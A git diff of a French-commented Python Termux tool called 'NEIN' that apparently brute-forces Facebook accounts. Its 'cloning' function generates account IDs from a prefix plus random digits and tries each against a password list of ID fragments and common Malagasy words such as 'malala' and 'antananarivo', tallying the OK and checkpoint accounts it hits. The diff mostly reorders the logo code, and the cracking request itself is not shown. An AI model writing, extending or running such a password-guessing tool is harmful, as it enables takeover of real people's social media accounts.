@@ -1,8 +1,3 @@
-# Définir le numéro de version
-version_actuelle = "1.5"
-
-
-
 import os
 import random
 import string 
@@ -14,6 +9,7 @@ import requests
 import sys
 import secrets
 import getpass
+import time
 os.system('git pull')
 
 #-------------color----------------#
@@ -31,10 +27,29 @@ warna = random.choice(my_color)
 oks=[]
 cps=[]
 loop=0
+
+# Définir le logo avant son utilisation dans la fonction meyexudi()
+logo=(f'''{B}
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
+{warna}--------------------------------------------{B}
+ Owner    : {M}CHRICE999{M}
+ TOOL NAME : {warna}{P}NEIN{P}{warna}
+ GROUPE-FB   : [TERMUX-COMAND]
+ STATUE : {H}FREE{H}
+ Facebook : {bblue}ITACHI SQ{bblue}
+ Tools    : {warna}[{M}VERSION 2.1{warna}]{warna}
+--------------------------------------------{B}''')
+
 # Liste des couleurs pour le logo, les lignes et chaque mot
 logo_colors = [B, C, P, H]
 line_colors = [bblack, M, H, byellow, bblue, P, C, B]
 word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
+
 #____APPROVAL SYSTEM ADD_____#
 def meyexudi():
   os.system('clear')
@@ -68,12 +83,12 @@ def meyexudi():
       meyexudi()
   except:
     sys.exit()
+
+# Appel à la fonction meyexudi() pour démarrer le programme
 meyexudi()
-#os.system("python ASIF.py")
+
 #-------------logo-----------------#
 logo=(f'''{B}
-
-
                                  
 ,--.  ,--.,------.,--.,--.  ,--. 
 |  ,'.|  ||  .---'|  ||  ,'.|  | 
@@ -92,13 +107,16 @@ logo=(f'''{B}
  Facebook : {bblue}ITACHI SQ{bblue}
  Tools    : {warna}[{M}VERSION 2.1{warna}]{warna}
 --------------------------------------------{B}''')
+
 #-------------linex def -------------#
 def linex():
     print(f'{warna}--------------------------------------------{B}')
+
 #-------------clear def -------------#
 def clear():
     os.system('clear')
     print(logo)
+
 #-------------main def------------#
 def MR_ITACHI():
     clear()
@@ -111,6 +129,7 @@ def MR_ITACHI():
         BD_CLONING()
     else:
         exit(' MERCI BEAUCOUP  :)')
+
 #------------- bd clone def ----------#
 def BD_CLONING():
     user=[]
@@ -138,12 +157,14 @@ def BD_CLONING():
             ids=code+psx
             passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
+
     linex()
     print(' LE CLONING EST FINI ')
     print(' TOTAL OK ID '+str(len(oks)))
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
+
 #------------ method crack def ---------#
 def method_crack(ids, passlist):
     global oks
@@ -190,7 +211,6 @@ def method_crack(ids, passlist):
         loop+=1
     except:
         pass
-#-------------end----------------#
 
 # Générateur de séquence aléatoire
 def generate_random_sequence(length):
@@ -199,4 +219,3 @@ def generate_random_sequence(length):
 
 # Appel à la fonction MR_ITACHI pour démarrer le programme
 MR_ITACHI()
-
